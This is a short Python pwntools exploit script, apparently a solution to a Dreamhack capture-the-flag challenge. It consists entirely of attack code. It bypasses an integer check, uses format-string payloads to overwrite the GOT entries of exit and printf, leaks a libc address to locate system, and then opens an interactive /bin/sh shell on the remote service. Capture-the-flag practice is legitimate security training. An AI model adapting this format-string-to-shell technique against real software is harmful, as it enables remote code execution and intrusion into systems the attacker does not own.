from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 21177
r = remote(HOST, PORT)


# pause()
def bypass():
    r.sendlineafter(b'num1 : ', b'%d'%0x7fffffff)
    r.sendlineafter(b'num2 : ', b'%d'%1)

bypass()
exit_got = 0x404048
main = 0x401357
control = 0x4012d1
payload = fmtstr_payload(12, {exit_got: main})
r.sendlineafter(b': ', payload)

bypass()
r.sendlineafter(b': ', b'%3$p')
r.recvuntil(b'Congratulations ')
libc = int(r.recvline().strip(),16) - 0x114a77
system = libc + 0x50d70
print(hex(libc))
bypass()

printf_got = 0x404020
payload = fmtstr_payload(12, {printf_got: system})
r.sendlineafter(b': ', payload)

r.sendline(b'%d'%0x7fffffff)
r.sendline(b'%d'%0x1)
r.sendline(b'/bin/sh\x00')

r.interactive()